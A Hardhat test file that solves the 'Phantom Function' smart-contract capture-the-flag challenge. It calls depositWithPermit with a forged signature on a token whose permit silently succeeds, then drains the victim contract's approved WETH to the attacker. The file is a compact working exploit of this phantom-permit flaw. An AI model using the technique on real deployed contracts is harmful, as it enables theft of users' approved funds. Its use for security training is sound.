import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { WrappedERC20, SetUp } from '../typechain-types'
import { toWei } from './helpers/utils'

describe('Phantom Function', async function () {
  let player: SignerWithAddress
  let challenge: SetUp

  before(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('SetUp')
    challenge = (await Challenge.deploy({
      value: toWei('10'),
    })) as SetUp
  })

  it('Attack', async function () {
    const wethAddr = await challenge.weth()
    const wwTokenAddr = await challenge.wwETH()
    const weth = (await ethers.getContractFactory('WETH')).attach(wethAddr)
    const wToken = (await ethers.getContractFactory('WrappedERC20')).attach(wwTokenAddr) as WrappedERC20

    const allowance = await weth.allowance(challenge.address, wToken.address)
    const bal = await weth.balanceOf(challenge.address)

    const value = allowance.lt(bal) ? allowance : bal
    await wToken
      .connect(player)
      .depositWithPermit(
        challenge.address,
        value,
        Math.floor(Date.now() / 1000) + 3600,
        27,
        ethers.utils.formatBytes32String('0x0'),
        ethers.utils.formatBytes32String('0xfff'),
        player.address
      )
    await wToken['withdraw()']()
    expect(await weth.balanceOf(player.address)).to.be.eq(value)
    expect(await challenge.isSolved()).to.be.true
  })
})
